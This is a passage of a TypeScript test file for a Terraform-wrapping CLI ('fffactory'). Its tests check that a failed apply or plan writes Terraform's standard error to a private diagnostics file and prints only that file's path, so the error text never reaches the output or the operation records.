  const MARKER = "diagnostic-marker-7f3e";
  const STDERR = `Error: creating EC2 Instance: UnauthorizedOperation\n  with ${MARKER}\n`;
  const SHOWN = JSON.stringify({
    format_version: "1.2",
    resource_changes: [
      { address: hostAddress("builder-1"), type: "aws_instance", change: { actions: ["create"] } },
    ],
  });
  let scratch: string;

  beforeAll(async () => {
    scratch = await realpath(await mkdtemp(join(tmpdir(), "fffactory-diagnostics-")));
  });

  afterAll(async () => {
    await rm(scratch, { recursive: true, force: true });
  });

  /**
   * The CLI over the real Terraform provisioner running the stand-in Terraform, with the
   * release's Terraform tree in a private cache (`XDG_CACHE_HOME`), and the in-memory bucket.
   */
  async function realTerraform(behaviors: Record<string, Behavior>) {
    const home = await mkdtemp(join(scratch, "cache-"));
    const cache = join(home, "fffactory");
    const root = join(cache, "releases", "0.3.0", "terraform", "factory");
    await mkdir(root, { recursive: true });
    await writeFile(join(root, ".terraform.lock.hcl"), "# lockfile\n");
    const terraform = await fakeTerraform(await mkdtemp(join(scratch, "bin-")));
    await terraform.behave(behaviors);
    const lockStore = new MemoryLockStore([BUCKET]);
    const store = new MemoryInstanceStore({ [PATH]: text(["builder-1"]) });
    const prompt = fakePrompt({ interactive: true, answers: ["yes"] });
    const context = harness(
      store,
      { XDG_CACHE_HOME: home },
      {
        lockStore,
        prompt: prompt.prompt,
        planStore: filesystemPlanStore(planStoreDirectory(cache)),
        provisioner: terraformProvisioner({
          cacheDirectory: cache,
          terraform: { install: async () => terraform.executable },
          run: terraformRunner({ PATH: process.env.PATH ?? "" }),
        }),
      },
    );
    const diagnostics = managedTerraformPaths(cache, SUPPORTED_TERRAFORM.version).diagnostics;
    return { ...context, lockStore, diagnostics };
  }

  /** The one diagnostics file a line names, checked to be private and to hold `STDERR`. */
  async function namedFile(line: string | undefined, directory: string) {
    const file = /^Terraform's diagnostics: (.+)$/.exec(line ?? "")?.[1] ?? "";
    expect(dirname(file)).toBe(directory);
    expect(await readFile(file, "utf8")).toBe(STDERR);
    expect((await stat(file)).mode & 0o777).toBe(0o600);
  }

  test("a failed apply prints only the path of a private file holding Terraform's standard error", async () => {
    const { context, out, err, lockStore, diagnostics } = await realTerraform({
      output: { stdout: "{}" },
      show: { stdout: SHOWN },
      apply: { exitCode: 1, stderr: STDERR },
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err.slice(0, 3)).toEqual([
      "Applying failed: `terraform apply` exited with status 1.",
      "Terraform may have changed some of the infrastructure before it stopped.",
      "Rerun `fffactory apply`: it plans again from what exists now and converges what remains.",
    ]);
    await namedFile(err[3], diagnostics);
    expect(err).toHaveLength(4);
    expect(out.at(-1)).toMatch(/^Operation record: s3:\/\//);
    expect([...out, ...err].join("\n")).not.toContain(MARKER);
    const records = JSON.stringify(lockStore.operationWrites);
    expect(records).not.toContain(MARKER);
    expect(records).not.toContain(diagnostics);
    expect(lockStore.operationWrites.at(-1)?.failure).toBe(
      "`terraform apply` exited with status 1",
    );
  });

  test("a failed plan prints the path too, and the diagnostics never reach the output", async () => {
    const { context, out, err, diagnostics } = await realTerraform({
      output: { stdout: "{}" },
      plan: { exitCode: 1, stderr: STDERR },
    });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toBe("fffactory: `terraform plan` exited with status 1");
    await namedFile(err[1], diagnostics);
    expect(err).toHaveLength(2);
    expect([...out, ...err].join("\n")).not.toContain(MARKER);
  });
});
